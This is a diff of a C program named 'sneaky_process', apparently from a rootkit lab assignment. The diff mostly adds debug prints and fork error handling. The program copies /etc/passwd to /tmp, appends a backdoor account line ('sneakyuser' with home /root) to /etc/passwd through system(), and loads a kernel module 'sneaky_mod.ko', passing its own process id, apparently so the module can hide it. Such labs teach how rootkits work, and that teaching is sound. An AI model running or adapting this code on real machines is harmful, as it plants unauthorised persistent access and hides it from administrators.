@@ -5,23 +5,30 @@
 #include<fcntl.h>
 #include<sys/stat.h>
 #include<sys/types.h>
-#include <string.h>
+//#include <string.h>
 #include <sys/wait.h>
 //const char *originfile="etc/password";
 //const char *tmpfile="tmp/password";
   
 
+
 int main(){
   //#1 print id
   printf("sneaky_process pid:%d\n",getpid());
-  int cur_pid=0;
+  int cur_pid=fork();
   //copy
-  if((cur_pid=fork())==0){
+  if(cur_pid<0){
+    perror("not fork\n");
+    return -1;
+  }
+  if(cur_pid==0){
+    printf("first fork\n");
     execlp("cp","cp","/etc/passwd","/tmp/passwd",NULL);
   }
   else{
+    printf("first fork\n");
     int status=0;
-    if(waitpid(cur_pid,&status,WUNTRACED|WCONTINUED)==-1){
+    if(waitpid(cur_pid,&status,0)==-1){
       perror("waitpid");
       return -1;
     }
@@ -34,18 +41,18 @@ int main(){
     }
   }
   //add
- 
+  printf("before add\n");
   system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
   //load module
   char cmd[100];
   sprintf(cmd, "insmod sneaky_mod.ko sneaky_process_id=%d", (int)getpid());
   system(cmd);
-
+  printf("before while\n");
   while(1){
     if(getchar()=='q')
       break;
   }
-
+  printf("after while\n");
   system("rmmod sneaky_mod");
 
 
